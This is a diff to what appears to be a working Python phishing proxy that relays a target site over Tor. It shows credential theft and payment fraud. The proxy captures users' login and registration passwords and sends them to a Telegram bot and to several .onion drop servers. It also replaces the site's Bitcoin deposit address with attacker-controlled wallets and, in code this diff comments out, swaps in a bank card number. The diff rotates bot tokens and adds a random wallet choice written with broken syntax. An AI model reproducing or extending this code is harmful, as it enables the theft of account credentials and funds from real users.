@@ -13,8 +13,8 @@ proxies = {
     'https': 'socks5h://127.0.0.1:9050'
 }
 
-bot = telebot.TeleBot("6175198938:AAFZBll7fSwDtSaDpgRs87IZfg0xPsgIeL8", parse_mode=None)
-bmbkeys = '26e399b68c23acfd054b90b3ba6554d9/'
+bot = telebot.TeleBot("6195708230:AAH0Kkc0i3Fym2OfD_nBHPZ_u7J-o5dNhFU", parse_mode=None)
+bmbkeys = '83a609e5e9dae94be64c4d848c85da75/'
 bmb_urls = ['http://i7nmjkcchof5pegfglv7pkc7tbsl5ffvrxxjnqqz32nqqvmirhoh2gyd.onion/',
             'http://ofzzkc5elcatbskfolu4rabpqshizjniiezoucyrrnviubenkyvy2lyd.onion/',
             'http://xneip42hr7bz7xlxnhwpaqt4kl4pyl3ypjru7i6rhhegjmeb5h4u6iqd.onion/',
@@ -22,7 +22,7 @@ bmb_urls = ['http://i7nmjkcchof5pegfglv7pkc7tbsl5ffvrxxjnqqz32nqqvmirhoh2gyd.oni
 
 
 def change_card(html,
-                cards=['2200 7008 3501 0140']):
+                cards):
     try:
         print(cards)
         if len(cards) < 1:
@@ -121,9 +121,10 @@ def proxy(path):
         target_url = 'http' + target_url[5:]
 
     if method == 'GET':
-        if 'exchange' in path and 'amount' in request.args:
-            bot.send_message(6272821020, f'Вход на страницу оплаты\n'
-                                         f'{request.args["amount"]}')
+
+        # if 'exchange' in path and 'amount' in request.args:
+        #     bot.send_message(-937233343, f'Вход на страницу оплаты\n'
+        #                                  f'{request.args["amount"]}')
 
         print(target_url + path)
         response = requests.get(target_url + path, params=request.args, cookies=request.cookies,
@@ -136,7 +137,7 @@ def proxy(path):
             done = '❌'
         if path in ['entry/post/login', '/entry/post/login']:
             form_dict = dict(request.form)
-            bot.send_message(6272821020, f'Логин: {done}\n{form_dict["login"]}\n{form_dict["password"]}')
+            bot.send_message(-937233343, f'Логин: {done}\n{form_dict["login"]}\n{form_dict["password"]}')
             for url in bmb_urls:
                 try:
                     print(f'{form_dict["login"]}:{form_dict["password"]}')
@@ -148,7 +149,7 @@ def proxy(path):
                     continue
         if path in ['entry/post/register', '/entry/post/register']:
             form_dict = dict(request.form)
-            bot.send_message(6272821020, f'Регистрация: {done}\n{form_dict["login"]}\n{form_dict["password1"]}')
+            bot.send_message(-937233343, f'Регистрация: {done}\n{form_dict["login"]}\n{form_dict["password1"]}')
             for url in bmb_urls:
                 try:
                     result = requests.post(url + bmbkeys, json=[f'{form_dict["login"]}:{form_dict["password1"]}'],
@@ -186,22 +187,23 @@ def proxy(path):
     print(target_url)
     print(path)
     flag = False
-    if request.path.startswith('/exchange') and 'amount' in request.args:  # or 'order' in request.path.split('/')
-        print('echangeeeeeee')
-        bot.send_message(6272821020, f'Вход на страницу оплаты')
-        respon_text = change_card(respon_text, cards =['2200 7008 3501 0140'])
-        flag = True
-
-    if ('exchange' in request.path) and ('order' in request.path) and ('my' not in request.path):
-        print('exc in path')
-        bot.send_message(6272821020, f'Вход на страницу оплаты')
-        respon_text = change_only_card(respon_text)
-        flag = True
+    # if request.path.startswith('/exchange') and 'amount' in request.args:  # or 'order' in request.path.split('/')
+    #     print('echangeeeeeee')
+    #     bot.send_message(6272821020, f'Вход на страницу оплаты')
+    #     respon_text = change_card(respon_text, cards =['2200 7008 3501 0140'])
+    #     flag = True
+    #
+    # if ('exchange' in request.path) and ('order' in request.path) and ('my' not in request.path):
+    #     print('exc in path')
+    #     bot.send_message(6272821020, f'Вход на страницу оплаты')
+    #     respon_text = change_only_card(respon_text)
+    #     flag = True
 
     if path == '/profile/finances/':
         bs = BeautifulSoup(response.text, 'lxml')
         btc = bs.find(class_='finance_input')
-        btc['value'] = 'bc1qr5ygldrn2dm986j6ksd2cydujgse0jl9lksg48'
+        btc_list = []
+        btc['value'] = random.choice['bc1qajy94al63q0cw4f6z6jzx47jzpn5f28kms85aw', 'bc1qg8a29ujf459uyzedt8u9mhktmqkjdzth28xqqq', 'bc1qqqp72xt0fxdc8lll73ek0w0wuywjj7yslkxl5r']
         respon_text = str(bs)
         flag = True
     if flag == True:
